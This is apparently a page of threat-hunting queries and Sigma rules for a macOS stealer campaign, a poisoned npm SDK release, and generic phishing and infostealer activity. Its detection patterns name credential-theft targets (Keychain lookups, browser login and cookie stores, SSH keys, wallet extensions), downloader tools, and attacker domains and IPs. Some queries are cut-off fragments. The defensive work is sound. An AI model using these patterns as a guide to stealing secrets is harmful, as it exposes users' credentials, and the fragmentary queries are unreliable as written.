[LLM] AUDIOFIX persistence: ChromeUpdater binary loaded via launchctl on macOS Installation High
Hunts the JINX-0164 AUDIOFIX persistence pattern — a payload that masquerades as the legitimate macOS audio daemon coreaudiod but is dropped on disk as 'ChromeUpdater' and registered with launchctl. Detects both the launchctl invocation that loads ChromeUpdater and any process executed from a path containing the ChromeUpdater binary, plus LaunchAgent/LaunchDaemon plist files referencing it. Rationale: The article explicitly states the payload 'masquerades as a system audio driver named coreaudiod, was saved as ChromeUpdater, and was executed via launchctl'. Legitimate Chrome auto-update on macOS uses GoogleSoftwareUpdate, NOT a file called ChromeUpdater — so any binary by that name is a clean detection. The launchctl+ChromeUpdater pair captures the persistence registration; the standalone process execution captures the running implant. StepSecurity's coverage independently confirms launchctl is the persistence mechanism. Cross-checked against: • https://www.stepsecurity.io/blog/velora-dex-sdk-compromised-on-npm-malicious-version-drops-macos-backdoor-via-launchctl-persistence • https://safedep.io/malicious-velora-dex-sdk-npm-compromised-rat/
ATT&CKT1543.001 T1543.004 T1036.005
Data sourcesEndpoint.Processes Endpoint.Filesystem
union
  (DeviceProcessEvents
   | where Timestamp > ago(30d)
   | where (FileName =~ "launchctl" and ProcessCommandLine has "ChromeUpdater")
        or FileName =~ "ChromeUpdater"
        or FolderPath has "/ChromeUpdater"
   | project Timestamp, DeviceName, AccountName, EventKind="ProcessExec", FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, SHA256),
  (DeviceFileEvents
   | where Timestamp > ago(30d)
   | where ActionType in ("FileCreated","FileRenamed","FileModified")
   | where (FolderPath has_any ("/Library/LaunchAgents/","/Library/LaunchDaemons/","/LaunchAgents/","/LaunchDaemons/") and (FileName has "ChromeUpdater" or FileName endswith ".plist"))
        or FileName =~ "ChromeUpdater"
   | where InitiatingProcessFileName !in~ ("GoogleSoftwareUpdate","GoogleSoftwareUpdateAgent","GoogleSoftwareUpdateDaemon")
   | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, EventKind="FileWrite", FileName, FolderPath, ProcessCommandLine="", InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, SHA256)
| order by Timestamp desc
union isfuzzy=true
  (ImProcessCreate
   | where TimeGenerated > ago(30d)
   | where (ActingProcessName has "launchctl" and ActingProcessCommandLine has "ChromeUpdater")
        or TargetProcessName has "ChromeUpdater"
   | project TimeGenerated, EventKind="ProcessExec", DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetProcessName, TargetProcessCommandLine, SHA256),
  (ImFileEvent
   | where TimeGenerated > ago(30d)
   | where (TargetFilePath has_any ("/Library/LaunchAgents/","/Library/LaunchDaemons/") and (TargetFileName has "ChromeUpdater" or TargetFileExtension =~ "plist"))
        or TargetFileName =~ "ChromeUpdater"
   | where ActingProcessName !has "GoogleSoftwareUpdate"
   | project TimeGenerated, EventKind="FileWrite", DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetProcessName="", TargetProcessCommandLine="", SHA256=TargetFileSHA256)
| order by TimeGenerated desc
title: JINX-0164 ChromeUpdater Persistence via launchctl (macOS)

[LLM] JINX-0164 AUDIOFIX delivery: shell payload retrieved from driver-store family domain Delivery High
Catches the JINX-0164 delivery chain where the victim — coerced from a LinkedIn 'recruiter meeting' lure — runs a curl/wget/bash invocation that retrieves the architecture-aware AUDIOFIX payload from apple.driver-store[.]com or related driver-* domains. The shell/curl process tree with one of these domains in the command line is the earliest detectable signal on host. Rationale: The article explicitly names 'apple.driver-store[.]com' as the bash-script host: 'The [bash] script downloaded an architecture-aware payload from the same domain'. Pairing a shell/curl/wget binary with one of the four published root domains turns delivery into a clean alert — these domains have no legitimate use, and a curl-to-domain process tree is exactly the runtime artefact the bash dropper produces. The osascript variant covers the case where the lure 'fake driver' app uses AppleScript instead of bash to fetch the second stage. Cross-checked against: • https://safedep.io/malicious-velora-dex-sdk-npm-compromised-rat/ • https://www.stepsecurity.io/blog/velora-dex-sdk-compromised-on-npm-malicious-version-drops-macos-backdoor-via-launchctl-persistence
ATT&CKT1566.002 T1059.004 T1105
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("curl","wget","bash","zsh","sh","osascript")
| where ProcessCommandLine has_any ("driver-store.com","driver-hub.net","driver-update.io","driver-updater.net")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where TargetProcessName has_any ("curl","wget","bash","zsh","sh","osascript")
| where TargetProcessCommandLine has_any ("driver-store.com","driver-hub.net","driver-update.io","driver-updater.net")
| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessName, TargetProcessCommandLine, ActingProcessName, ActingProcessCommandLine, ParentProcessName
| order by TimeGenerated desc

[LLM] AUDIOFIX credential staging: Python parent invoking security/sqlite3/keychain extraction on macOS Actions on Objectives Medium
Hunts the AUDIOFIX Python stealer's post-execution behaviour — a Python interpreter parent that spawns the macOS `security`, `sqlite3`, `plutil`, `ditto`, or archive utilities against Keychain databases, browser crypto-wallet extension directories, SSH keys, and chat-app session stores (Discord/Slack/Telegram). The Python→sensitive-path child relationship is the discriminating signal that separates a stealer from a benign Python dev script. Rationale: The article enumerates AUDIOFIX's target stash in detail: 'credentials from password managers, web browsers, and iCloud Keychain files; local admin credentials; SSH keys; configuration files; console history files; cryptocurrency browser extensions information; cryptocurrency wallet addresses; and active Discord, Slack, and Telegram sessions.' These map to specific macOS paths/extensions (login.keychain-db, MetaMask extension ID nkbihfbeogaeaoehlefnkodbefgpgknn, Phantom ejbalbakoplchlghecdalmeeeajnimhm, ~/.ssh, Application Support/Discord|Slack|Telegram). The discriminator — Python *parent* spawning macOS security/sqlite3 against ≥2 of these distinct targets — is the AUDIOFIX shape; isolated single hits are noise. Cross-checked against: • https://safedep.io/malicious-velora-dex-sdk-npm-compromised-rat/
ATT&CKT1555.001 T1555.003 T1539 T1552.004

| where InitiatingProcessFileName matches regex @"^python[0-9.]*$"
| where FileName in~ ("security","sqlite3","plutil","ditto","cp","mv","tar","zip","openssl","base64")
| where ProcessCommandLine has_any (
    "login.keychain",
    "keychain-db",
    "find-generic-password",
    "find-internet-password",
    "Local Extension Settings",
    "/Discord",
    "/Slack",
    "/Telegram",
    "/.ssh/",
    "MetaMask",
    "Phantom",
    "Bitwarden",
    "1Password",
    "nkbihfbeogaeaoehlefnkodbefgpgknn",
    "fhbohimaelbohpjbbldcngcnapndodjp",
    "ejbalbakoplchlghecdalmeeeajnimhm")
| summarize DistinctTargets = dcount(ProcessCommandLine), SampleCmds = make_set(ProcessCommandLine, 8), FirstSeen = min(Timestamp), LastSeen = max(Timestamp), ChildBins = make_set(FileName) by DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine
| where DistinctTargets >= 2
| order by LastSeen desc
ImProcessCreate

[LLM] Supply chain: install or runtime import of poisoned @velora-dex/sdk@9.4.1 (MiniRAT dropper) Delivery High
Detects installation, lockfile pinning, or runtime invocation of the @velora-dex/sdk npm package — specifically the malicious 9.4.1 version that ships a base64 payload in dist/index.js which fetches MiniRAT, a Go-based macOS RAT persisted via launchctl. Covers npm/yarn/pnpm CLI invocations and node processes whose command line references the package. Rationale: The article identifies @velora-dex/sdk as the poisoned npm package delivering MiniRAT, and SafeDep + StepSecurity independently confirmed the malicious release as **version 9.4.1** with three injected lines in dist/index.js that decode a base64 payload at import time (no install hook). Detecting the package name covers both install (`npm install`) and runtime (`node` execution of code that imports it). The pnpm path includes the version in the directory name (`@velora-dex+sdk@9.4.1`), giving us a clean version-pinned signal in file-create telemetry. Cross-checked: SafeDep (https://safedep.io/...), StepSecurity (https://www.stepsecurity.io/blog/...). Cross-checked against: • https://safedep.io/malicious-velora-dex-sdk-npm-compromised-rat/ • https://www.stepsecurity.io/blog/velora-dex-sdk-compromised-on-npm-malicious-version-drops-macos-backdoor-via-launchctl-persistence
ATT&CKT1195.002 T1059.007 T1027.013
Data sourcesEndpoint.Processes Endpoint.Filesystem
union
  (DeviceProcessEvents
   | where Timestamp > ago(60d)
   | where FileName in~ ("npm","node","yarn","pnpm","npx")
        or InitiatingProcessFileName in~ ("npm","node","yarn","pnpm","npx")
   | where ProcessCommandLine has "@velora-dex/sdk"
        or ProcessCommandLine has "velora-dex+sdk"
        or InitiatingProcessCommandLine has "@velora-dex/sdk"
   | project Timestamp, DeviceName, AccountName, EventKind="ProcessExec", FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName),
  (DeviceFileEvents
   | where Timestamp > ago(60d)
   | where FolderPath has_any ("node_modules/@velora-dex/sdk","node_modules/.pnpm/@velora-dex+sdk@9.4.1","@velora-dex\\sdk")
   | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, EventKind="FileWrite", FileName, FolderPath, ProcessCommandLine="", InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName="")
| order by Timestamp desc
union isfuzzy=true
  (ImProcessCreate
   | where TimeGenerated > ago(60d)
   | where TargetProcessName has_any ("npm","node","yarn","pnpm","npx") or ActingProcessName has_any ("npm","node","yarn","pnpm","npx")
   | where TargetProcessCommandLine has "@velora-dex/sdk" or ActingProcessCommandLine has "@velora-dex/sdk" or TargetProcessCommandLine has "velora-dex+sdk"
   | project TimeGenerated, EventKind="ProcessExec", DvcHostname, ActorUsername, TargetProcessName, TargetProcessCommandLine, ActingProcessName, ActingProcessCommandLine),
  (ImFileEvent
   | where TimeGenerated > ago(60d)
   | where TargetFilePath has_any ("node_modules/@velora-dex/sdk","node_modules/.pnpm/@velora-dex+sdk@9.4.1")
   | project TimeGenerated, EventKind="FileWrite", DvcHostname, ActorUsername, TargetProcessName=ActingProcessName, TargetProcessCommandLine=ActingProcessCommandLine, ActingProcessName, ActingProcessCommandLine)
| order by TimeGenerated desc

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats summariesonly=false earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats summariesonly=false count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats summariesonly=false earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count
    from datamodel=Email.All_Email

| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("AnyDesk.exe","TeamViewer.exe","TeamViewer_Service.exe",
        "ScreenConnect.ClientService.exe","ConnectWiseControl.ClientService.exe",
        "atera_agent.exe","SplashtopStreamer.exe","RustDesk.exe","NinjaOne.exe","kaseya*.exe")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("AnyDesk.exe","TeamViewer.exe","TeamViewer_Service.exe",
        "ScreenConnect.ClientService.exe","ConnectWiseControl.ClientService.exe",
        "atera_agent.exe","SplashtopStreamer.exe","RustDesk.exe","NinjaOne.exe","kaseya*.exe")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
Network connections to article IPs / domains Command & Control High
Outbound traffic to attacker infrastructure named in the article.
ATT&CKT1071
Data sourcesNetwork_Traffic.All_Traffic Web Network_Resolution.DNS DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP in ("185.100.85.250", "84.32.83.250", "163.172.53.20", "185.100.85.98", "153.92.126.84", "45.45.217.242", "89.36.224.5", "208.115.220.17", "185.175.59.85") or RemoteUrl has_any ("apple.driver-store.com", "driver-store.com", "windows.driver-store.com", "driver-updater.net", "driver-hub.net", "apple.driver-hub.net", "driver-update.io", "apple.driver-update.io", "drvstore.com", "live.us.org")
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessFileName, InitiatingProcessCommandLine
let BadIPs     = dynamic(["185.100.85.250", "84.32.83.250", "163.172.53.20", "185.100.85.98", "153.92.126.84", "45.45.217.242", "89.36.224.5", "208.115.220.17", "185.175.59.85"]);
let BadDomains = dynamic(["apple.driver-store.com", "driver-store.com", "windows.driver-store.com", "driver-updater.net", "driver-hub.net", "apple.driver-hub.net", "driver-update.io", "apple.driver-update.io", "drvstore.com", "live.us.org"]);
ImNetworkSession
| where TimeGenerated > ago(7d)
| where DstIpAddr in (BadIPs)
   or Url has_any (BadDomains)
| project TimeGenerated, DvcHostname, DstIpAddr, DstPortNumber, Url, NetworkProtocol
| order by TimeGenerated desc

title: Outbound Connection to Article-Named IP / Domain
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0f
status: experimental
description: |
    Replace `__IP_LIST__` / `__DOMAIN_LIST__` placeholders with
    article-specific destinations. For dynamic IOC management, use a
    watchlist or external feed.
references:
    - https://attack.mitre.org/tactics/TA0011/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.command-and-control
logsource:
    category: network_connection
    product: windows
detection:
    selection_ip:
        DestinationIp:
            - '__IP_PLACEHOLDER_1__'
            - '__IP_PLACEHOLDER_2__'
    selection_domain:
        DestinationHostname:
            - '__DOMAIN_PLACEHOLDER_1__'
            - '__DOMAIN_PLACEHOLDER_2__'
    condition: selection_ip or selection_domain
falsepositives:
    - None on a true-positive IOC match
level: critical

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["65cba741fe30fa4799fb9002ea8de6d96042a59159dd7c3419c766af24c835e6", "0b1a36a31b952341a534fe24890f1ed2921ee259773cff46e4f6273b8c4d5d21", "e8ee6f5145c9d503c5130bfc6585567f6e19d409158c3c0ca0b259f1875b15f4", "3e3901519c2305fbe9d5483b7234c25c6d2b562512916481d96f26b849c39fdb", "0a8ab3d16b12d3a453ee5a3208fe04744ad54514ef8ea27bb8fe32679efad270", "a35d2b67fa478a7174e308b43ce30bf69b3bc6f44fa76197fdf95fc2fbc1cf5b", "9c2ce925133a3bf5a924063bbef8df49918d5b7258695c1894cd18c75970157a", "402625ec79e3573a80b6de9b33fc1e503e3c7803603cd958ddd515fb0549007c", "b6cab0b3aa8e56e2427f486c74588d598ae58bb0cbc0eda6939fe171cb0aed17", "d4e863f9818bfb2f1dd932df6441dff204e6142c3bdb55b298cb08dc7b6a0c62", "c6ef82d2864dfd26f117a1ef5602679153423f2742970a7949cec72722f0a01e", "2a10ffe0367bb1b26ba2c3bc600892c21074725c0b8c9dc9161e6ceb33915460"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

